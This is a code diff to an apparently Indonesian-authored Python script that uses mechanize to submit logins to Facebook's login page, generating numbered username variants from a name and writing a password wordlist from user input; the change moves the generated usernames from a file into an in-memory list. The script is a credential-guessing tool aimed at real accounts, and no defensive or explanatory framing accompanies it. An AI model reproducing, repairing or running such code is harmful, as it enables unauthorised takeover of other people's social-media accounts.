@@ -22,8 +22,8 @@ dev.set_handle_referer(True)
 dev.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 log = "https://www.facebook.com/login.php?login_attempt=1"
 # log1 = "https://m.facebook.com" 
-users = open("user.txt", "r").readlines()
-
+# users = open("user.txt", "r").readlines()
+users = []
 
 def user_dev():
   try:
@@ -38,16 +38,14 @@ def user_dev():
   	sandi1 = san_dev.replace(' ', '\n').replace(',', '\n').replace('/', '\n')
   	sandi = sandi1.replace('\n\n', '\n')
   	# set usernmae
-  	users = us.replace(' ', '.')
+  	userz = us.replace(' ', '.')
   	p = open("pass.txt", "w")
   	p.write(sandi)
   	p.close()
   	open("user.txt", "w").write("")
   	for has in range(1, jumlah+1):
   	  try:
-  		u = open("user.txt", "a")
-  		u.write(users+"."+str(has)+"\n")
-  		u.close()
+  		users.append(userz+'.'+str(has))
   	  except:
   	  	pass
   except KeyboardInterrupt: 
